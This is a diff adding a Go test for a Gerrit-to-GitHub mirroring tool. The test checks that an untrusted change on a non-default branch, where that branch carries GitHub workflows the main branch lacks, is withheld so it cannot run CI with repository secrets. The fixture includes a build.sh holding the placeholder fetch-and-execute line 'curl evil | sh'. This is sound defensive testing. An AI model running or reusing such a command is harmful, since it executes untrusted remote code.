@@ -3229,6 +3229,38 @@ func TestPushGuardLooksAtWhatGitHubUses(t *testing.T) {
 	}
 }
 
+// The default branch's workflows are the ones the site vets (§9.1). A
+// stranger's change for another branch (an old release, someone's branch
+// pushed without review) that has workflows main does not must not reach
+// GitHub, which runs them, with the repository's secrets, on the branch
+// pushed and on its PR, though the change touches none (eighth audit).
+func TestWorkflowsOfAnotherBranchAreWithheld(t *testing.T) {
+	s := newSites(t)
+	ctx := context.Background()
+	c, store := s.code(ctx)
+	m0 := s.commit("", "a.txt", "a\n", "base")
+	s.push("gerrit.git", m0, "refs/heads/main")
+	s.push("github.git", m0, "refs/heads/main")
+	// An old branch, or someone's unreviewed one, with a workflow main does
+	// not have (or no longer has).
+	os.MkdirAll(filepath.Join(s.dir, "work", ".github", "workflows"), 0o755)
+	r0 := s.commit(m0, ".github/workflows/ci.yml", "on: [push, pull_request]\njobs: {t: {runs-on: ubuntu-latest, steps: [{run: ./build.sh}]}}\n", "old CI")
+	s.push("gerrit.git", r0, "refs/heads/release")
+	s.push("github.git", r0, "refs/heads/release")
+	// A stranger's change for that branch, which does not touch .github/.
+	msg := "Innocent\n\nChange-Id: " + cid(7) + "\n"
+	ci := s.change(7, cid(7), s.commit(r0, "build.sh", "curl evil | sh\n", msg), msg, "NEW")
+	ci.Branch = "release"
+	if err := c.Reconcile(ctx, Key{Branch: "release"}); err != nil {
+		t.Fatal(err)
+	}
+	st, _ := store.Load(ctx, 7)
+	head := "gerrit/release/" + cid(7)
+	if out := s.gitOut("github.git", "ls-tree", "-r", "--name-only", "refs/heads/"+head); out != "" || st.State.WithheldNotice == 0 {
+		t.Errorf("pushed %s (PR %d), holding:\n%s\nwant it withheld: a workflow the default branch does not have, plus the stranger's build.sh", head, st.State.PR, out)
+	}
+}
+
 // New PRs beyond an owner's budget wait; begun ones, PRs already made and
 // trusted owners' do not; creating a PR spends from the budget.
 func TestNewPRsWithinTheOwnersBudget(t *testing.T) {
